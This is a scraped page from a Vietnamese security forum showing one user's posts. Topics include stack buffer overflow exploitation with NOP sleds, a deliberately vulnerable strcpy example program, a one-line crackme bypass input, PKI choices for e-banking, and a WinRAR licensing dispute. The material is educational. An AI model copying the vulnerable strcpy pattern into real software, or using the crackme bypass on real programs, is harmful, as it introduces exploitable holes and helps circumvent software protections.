</blockquote><br/><br/> 1. Để verify, bồ thử chạy chương trình trong gdb, rồi xem nó bị segfault chỗ nào. Nếu tôi nhớ không lầm thì nó bị segfault ngay trong strcpy, chứ không phải segfault khi hàm main return.<br/><br/> 2. Đúng. Do không đoán đúng được địa chỉ của RET, nên người ta mới dùng NOP sled, để tăng xác suất RET sẽ nhảy về ngay trong đoạn NOP sled.<br/><br/> 3. gamma95 đã giải thích nguyên nhân rồi.<br/><br/> 4. Câu hỏi này muốn trả lời rốt ráo thì phải xem cái chương trình cần exploit nó được compile ra sao và chạy trong môi trường nào. Nói cách khác, compiler và bản thân kernel của hệ điều hành ảnh hưởng rất lớn đến các kỹ thuật exploitation.<br/><br/> Cùng là một chương trình kể trên, compiled bằng gcc 2.95 và chạy trên kernel không có bất kỳ biện pháp bảo vệ nào khác, thì có hàng chục cách để khai thác. Nhưng cũng là chương trình đó, compiled bằng gcc &gt; 4.1 và chạy trên kernel kiểu của project Hardened Gentoo với tất cả các option được kích hoạt thì có khi không thể exploit được.<br/><br/> Tôi đang viết một tài liệu nhỏ để tổng kết những vấn đề này (như là một ghi chú cho bản thân thôi), khi nào xong tôi sẽ gửi lên HVA.<br/><br/> --m</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/27.html">Thông tin về các địa chỉ và tài liệu hữu ích</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/23485.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/23485/141434.html#141434,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">Sửa lại mẫu của anh lamer tí:<br/><br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>int main&#40;int argv,char **argc&#41; {
char buf&#91;256&#93;;
strcpy&#40;buf,argc&#91;1&#93;&#41;;
}</pre>
</div></span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/31.html">Thảo luận mạng và thiết bị mạng</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/23343.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/23343/141166.html#141166,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">Thực tế khi làm public service, nhất là dạng service hướng đến consumer, không ai làm theo hướng dựng private CA, rồi cấp phát certificate cho từng người cả.<br/><br/> Làm security, như anh lamer nói, không chỉ đơn thuần là vấn đề kỹ thuật, mà phải biết tính toán, chọn lựa giữa các trade-off, để làm sao giải pháp của mình, vừa an toàn, nhưng cũng vừa đơn giản, dễ sử dụng với chi phí chấp nhận được.<br/><br/> Làm hệ thống PKI rồi cấp cho từng khách hàng một certificate, đúng là nhìn có vẻ an toàn , nhưng tại sao những ông lớn như Google, Yahoo, Microsoft đều kô chọn cách làm này khi triển khai các sản phẩm dành cho đại chúng của họ?<br/><br/> Mà tôi thấy rất lạ, hễ nhắc đến security, bàn đến security, là thể nào cũng sẽ có người đưa ra cái ý kiến là phải dựng private CA :p.<br/><br/> --m</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/31.html">Thảo luận mạng và thiết bị mạng</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/23343.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/23343/141117.html#141117,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody"><p></p>
<cite class="blockquote">vikjaga wrote:</cite><br>
<blockquote><br/> + triển khai mua và áp dụng CA của Verisign như thế nào.<br/> + các biện pháp triển khai security như thế nào ...<br/> &nbsp;
</blockquote><br/><br/> + Lên trực tiếp www.verisign.com mà mua, chỉ cần credit card và chuẩn bị sẵn giấy tờ: giấy phép kinh doanh, giấy chứng nhận sở hữu tên miền...<br/><br/> + Hỏi thế này thì chung quá. Có rất nhiều thứ phải lo.<br/><br/> <p></p>
<cite class="blockquote">vikjaga wrote:</cite><br>
<blockquote><br/> - Theo em nghĩ thỉ hiện nay giao dịch qua internet tại việt nam chắc không ai dám dùng nhất là các doanh nghiệp.<br/> &nbsp;
</blockquote><br/><br/> Kô có đâu bồ, người ta xài ầm ầm từ vài năm nay rồi đó bồ. Giao dịch mỗi tháng lên đến cả trăm tỉ đồng, chưa kể doanh nghiệp.<br/><br/> Mà có chỗ này tôi không hiểu, sao làm e-banking mà lại đi kêu gọi đấu thầu nhỉ? Tự vì làm e-banking nó sẽ gắn trực tiếp với hệ thống core banking hiện có của ngân hàng, nếu mà người trong ngân hàng kô có khả năng làm, thì tôi e là người ngoài sẽ khó mà làm.<br/><br/> BTW, tranh thủ quảng cáo tí, nếu bên bồ cần người tư vấn làm cái này, tôi nghĩ tôi có thể giúp :p. Tôi từng triển khai một hệ thống e-banking cho hơn 300.000 khách hàng (and counting) với đầy đủ các nghiệp vụ/dịch vụ trên đó. Tôi hơn anh conmale ở chỗ tôi đang ở VN <img src="/hvaonline/images/smilies/068ae40523a24c9ef54edefd375e542d.gif" border="0" alt="smilie" align="absbottom">.<br/><br/> --m<br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/5.html">Góp ý và Hỏi đáp thắc mắc chung</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/23373.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/23373/140660.html#140660,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">Ôi giời, tôi thấy mấy cái nút cảm ơn như vậy chẳng có giá trị chi hết trơn. Nếu muốn cảm ơn, thì tốt nhất là đọc cho kỹ những gì người ta viết, tìm ra những chỗ sai, tìm ra những nơi có thể đào sâu, để mà cùng nhau thảo luận.<br/><br/> --m</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/36.html">Thủ thuật reverse engineering</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/22743.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/22743/139006.html#139006,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">Nếu chỉ cần hiện ra "Great work!" thì có cách đơn giản thế này:<br/><br/> $ python -c 'print "\x00\x0a\x00\x0a"' | ./small<br/> -&gt; Small crackme for Stingduk &lt;-<br/> Give me your name (max 50 chars): Pass me the serial (max 50 chars): Great work!</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/36.html">Thủ thuật reverse engineering</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/22826.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/22826/137579.html#137579,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">Tôi đã nói trong một post ở page 10 là ông Quảng đã nhầm lẫn giữa *bản quyền* và *giấy phép sử dụng*. WinRAR trước giờ họ chỉ cấp *giấy phép sử dụng* chứ họ chưa hề bán hay sang nhượng *bản quyền* của họ cho ông Quảng và BKIS.<br/><br/> Tôi thấy một số người cứ đưa ra hết giả thuyết này đến giả thuyết khác, nếu thế này rồi nếu thế khác, để hòng chứng minh là ông Quảng và BKIS không vi phạm bản quyền của WinRAR.<br/><br/> Ban đầu là nói việc tách và nhúng rar.exe như vậy, không cần ông Quảng và BKIS có mua *giấy phép sử dụng* hay không, là không vi phạm bản quyền. Lập luận này đã được tôi bác bỏ, khi chỉ ra các điểm 4a và 4b trong *giấy phép sử dụng* của WinRAR mà BKIS vi phạm.<br/><br/> Rồi tiếp theo, khi ông Quảng đưa ra thông tin là ông Quảng có mua *giấy phép sử dụng* của WinRAR, một số người lại nháo nhào lên, "đó thấy chưa, BKIS có quyền mà". Anh <b>nbthanh</b> đã chứng minh là *giấy phép sử dụng* nếu có của ông Quảng không thể là loại giấy phép cho phép ổng được làm các việc mà BKIS đang làm, bởi lẽ WinRAR chưa bao giờ cung cấp một giấy phép như thế. Tôi cũng đã chứng minh, với giấy phép sử dụng bình thường, ông Quảng và BKIS đã vi phạm điều số 9.<br/><br/> Tiếp tục, một số người lại đưa ra giả thuyết, ông Quảng và BKIS mua loại giấy phép "Multiple Usage License". Tôi đã chứng minh, có cái giấy phép đó đi chăng nữa, ông Quảng và BKIS cũng đã vi phạm điều số 3.<br/><br/> Và cuối cùng, giả thuyết bây giờ là ông Quảng và BKIS mua luôn cái bản quyền của WinRAR. Nếu một license như anh nbthanh hỏi đám WinRAR mà đám đó còn chưa cấp, thì khả năng để đám đó bán luôn cái bản quyền của họ là cực kỳ thấp, nếu không muốn nói là chỉ có trong suy nghĩ của những người ngây thơ cụ.<br/><br/> Tôi nghĩ rất có thể, một chút nữa sẽ xuất hiện giả thuyết: ông Quảng và BKIS đã mua luôn cả cái công ty WinRAR.<br/><br/> ---<br/><br/> Gửi những người đọc topic này,<br/><br/> Nếu mọi người đọc kỹ, sẽ thấy, như anh nbthanh đã nói, toàn bộ những luận cứ của nhóm người ủng hộ BKIS (và cho rằng BKIS không phạm luật) đều được xây dựng dựa trên các giả thuyết *nếu như*, mà tôi đã tóm tắt lại ở trên.<br/><br/> Còn những luận cứ của nhóm người cho rằng BKIS phạm luật đa số đều là "nói có sách, mách có chứng", dựa trên những chứng cứ rõ ràng và đi thẳng trực tiếp vào vấn đề.<br/><br/> ---<br/><br/> Gửi các bạn là mod của HVA đang theo dõi topic này,<br/><br/> Để bảo vệ chủ đề thảo luận, tôi đề nghị các bạn thẳng tay lock nick và delete những bài viết đặt ra các giả thuyết mà không có bất kỳ luận cứ nào để ủng hộ, ngoài nhận định cảm tính của người viết.<br/><br/> Cảm ơn,<br/><br/> --m</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/36.html">Thủ thuật reverse engineering</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/22826.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/22826/137534.html#137534,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody"><p></p>
<cite class="blockquote">chinhtruc wrote:</cite><br>
<blockquote><p></p>
<cite class="blockquote">mrro wrote:</cite><br>
<blockquote><br/><br/> Điều số 4 của giấy phép WinRAR quy định:<br/> <p></p>
<cite class="blockquote">WinRAR's license wrote:</cite><br>
<blockquote><br/> The RAR/WinRAR <font color='red'><b>unregistered trial version</b></font> may be freely distributed, with exceptions noted below, provided the distribution package is not modified in any way.<br/><br/> a. No person or company may distribute separate parts of the package with the exception of the UnRAR components, without written permission of the copyright owner.<br/><br/> b. The RAR/WinRAR unregistered trial version may not be distributed inside of any other software package without written permission of the copyright owner.<br/><br/> c. Hacks/cracks, keys or key generators may not be included on the same distribution.<br/> &nbsp;
</blockquote><br/> &nbsp;
</blockquote><br/><br/> Bồ mrro đọc cho kỹ, chỗ <font color='red'><b>đậm đỏ</b></font>.<br/><br/> Trên vietnamnet có nói là ông Quảng đã có bản quyền winrar. Cho nên điều này không áp dụng được.<br/> &nbsp;
</blockquote><br/><br/> Có hai điểm bồ nên hiểu:<br/><br/> 1. Phiên bản rar.exe phân phối đính kèm với BKAV Pro là phiên bản không có bản quyền, nên điều này vẫn được áp dụng.<br/><br/> 2. Dẫu cứ xem BKAV Pro đã mua license, và đính kèm phiên bản rar.exe mà họ đã mua vào BKAV Pro, thì họ vẫn vi phạm toàn bộ điều thứ 9 trong license của WinRAR:<br/><br/> <p></p>
<cite class="blockquote">WinRAR's license wrote:</cite><br>
<blockquote><br/> 9. You may not use, <b>copy</b>, emulate, <b>clone</b>, rent, lease, <b>sell</b>, modify, decompile, disassemble, otherwise reverse engineer, or <b>transfer the licensed program, [b]or any subset of the licensed program</b>, except as provided for in this agreement. Any such unauthorized use shall result in immediate and automatic termination of this license and may result in criminal and/or civil prosecution.<br/><br/> Neither RAR binary code, WinRAR binary code, UnRAR source or UnRAR binary code may be used or reverse engineered to re-create the RAR compression algorithm, which is proprietary, without written permission of the author.<br/><br/> <i>RAR and WinRAR keyfiles may not be distributed, except as stated in item 3) above, outside of the area of legal control of the person or persons who purchased the original license, without written permission of the copyright holder.</i><br/><br/> All rights not expressly granted here are reserved by Alexander Roshal.<br/> &nbsp;
</blockquote><br/><br/> Chú ý hai điểm ở điều số 9 này:<br/><br/> 1. WinRAR không cho phép người sử dụng được phép copy, clone, sell hay transfer cái registered RAR/WinRAR hoặc một phần của register RAR/WinRAR.<br/><br/> 2. WinRAR nói rằng, nếu không có written permission, không ai có quyền phân phối keyfile của WinRAR, ngoại trừ trường hợp người đó đã mua "Multiple USAGE license" ở điều thứ 3:<br/><br/> <p></p>
<cite class="blockquote">WinRAR's license wrote:</cite><br>
<blockquote><br/> There are 2 basic types of licenses issued for WinRAR, these are:<br/><br/> a. A single computer USAGE license. The user purchases ONE license to USE the WinRAR archiver on ONE computer.<br/><br/> b. A Multiple USAGE license. The user purchases a number of USAGE licenses for use, by the purchaser, the purchaser's employees or accredited agents, on the same number of computers.<br/><br/> The number of licenses in network environment must not be less than the maximum possible amount of simultaneous users.<br/><br/> Once registered, the user is granted a non-exclusive license to use WinRAR on as many computers as defined by the licensing terms above according to the number of licenses purchased, for any legal purpose. The registered WinRAR software may not be rented or leased, but may be permanently transferred, in it's entirety, if the person receiving it agrees to the terms of this license. If the software is an update, the transfer must include the update and all previous versions.<br/> &nbsp;
</blockquote><br/><br/> Rõ ràng, nếu BKIS nói họ phân phối cái keyfile, sau khi người sử dụng bỏ tiền ra mua bản BKAV Pro thì BKIS cũng đã vi phạm cái điều thứ 3 này.<br/><br/> Thậm chí, cứ cho rằng họ đã có mua "Multiple USAGE license" (điều này là không tưởng, như phân tích về giá cả mà anh <b>TQN</b> đã nói từ đầu topic), thì cái cách âm thầm đưa rar.exe vào, cũng vi phạm cái đoạn <b>The registered WinRAR software may not be rented or leased, but may be permanently transferred, in it's entirety, if the person receiving it agrees to the terms of this license</b>.<br/><br/> Bồ chinhtruc nếu không còn gì nói nữa, không có luận cứ mới, thì tốt nhất hãy im lặng. Nếu bồ cứ lập lại những luận cứ đã được tôi và các anh em ở đây trả lời rồi thì tôi sẽ không trả lời bồ nữa.<br/><br/> --m</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
				
        <!-- END OF POST LISTING -->
			
				

			
      </table>
		
			<table cellspacing="2" cellpadding="2" width="100%" align="center" border="0">
				<tr>					
					
					<td valign="middle" align="left" colspan="0">
						<span class="nav">
						&nbsp;
						</span>
					</td>

					<td valign="middle" align="right">					
		<table cellspacing="0" cellpadding="0" border="0">
		<tr>			  
			<td nowrap="nowrap" align="right">
				<form action="" name="p" id="p" accept-charset="UTF-8"> 
					
					<span class="gensmall">Go to Page:&nbsp;</span>
					
						<a href="/hvaonline/posts/listByUser/158.html">
							<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_first_page.gif" width="8" height="9" alt="First Page" title="First Page"/>
						</a>
								<a href="/hvaonline/posts/listByUser/480/158.html">
									<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_prev_page.gif" width="5" height="9" alt="Page 17" title="Page 17"/>
								</a>
							
								<span class="gensmall"><a href="/hvaonline/posts/listByUser/510/158.html">18</a></span>
								<span class="gensmall"><a href="/hvaonline/posts/listByUser/540/158.html">19</a></span>
								<span class="gensmall"><a href="/hvaonline/posts/listByUser/570/158.html">20</a></span>
							
					
						<select onchange="if(this.options[this.selectedIndex].value > 0){ document.location = '/hvaonline/posts/listByUser/'+ ( (this.options[this.selectedIndex].value - 1) * 30)  + '/158' + '.html'; }" name="select2">
							<option value="-1" selected="selected">---</option>		
							
								<option value="1" >1</option>	
								<option value="2" >2</option>	
								<option value="3" >3</option>	
								<option value="4" >4</option>	
								<option value="5" >5</option>	
								<option value="6" >6</option>	
								<option value="7" >7</option>	
								<option value="8" >8</option>	
								<option value="9" >9</option>	
								<option value="10" >10</option>	
								<option value="11" >11</option>	
								<option value="12" >12</option>	
								<option value="13" >13</option>	
								<option value="14" >14</option>	
								<option value="15" >15</option>	
								<option value="16" >16</option>	
								<option value="17" >17</option>	
								<option value="18" >18</option>	
								<option value="19" >19</option>	
								<option value="20" >20</option>	
								<option value="21" selected="selected">21</option>	
								<option value="22" >22</option>	
								<option value="23" >23</option>	
								<option value="24" >24</option>	
								<option value="25" >25</option>	
						</select>
						
								<span class="gensmall"><a href="/hvaonline/posts/listByUser/630/158.html">22</a></span>
								<span class="gensmall"><a href="/hvaonline/posts/listByUser/660/158.html">23</a></span>
								<span class="gensmall"><a href="/hvaonline/posts/listByUser/690/158.html">24</a></span>
								<a href="/hvaonline/posts/listByUser/720/158.html">
									<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_next_page.gif" width="5" height="9" alt="Page 25" title="Page 25"/>
								</a>
						
						<a href="/hvaonline/posts/listByUser/720/158.html">
							<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_last_page.gif" width="8" height="9" alt="Last Page" title="Last Page (25)"/>
						</a>
				</form>
			</td>
		</tr>
		</table>
</td>
				</tr>
				
				<tr>
					<td colspan="3"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
				</tr>			
			</table>
		</td>
	</tr>
</table>


	<tr>	
		<td align="center">
		<br>
					</td>
	</tr>

	<tr>
		<td align="center">
			<span class="copyright">Powered by JForum - Extended by <a href="MailTo:lienlac@hvaonline.net">HVAOnline</a><br>
			&nbsp;hvaonline.net&nbsp; | &nbsp;hvaforum.net&nbsp; | &nbsp;hvazone.net&nbsp; | &nbsp;hvanews.net&nbsp; | &nbsp;vnhacker.org<br>
			1999 - 2013 &copy;
			v2012|0504|218|
		  </span>
	  </td>
	</tr>
<iframe src="/hvaonline/templates/ping_session.jsp" height="0" width="0" frameborder="0" scrolling="no"></iframe>
</body>
</html>
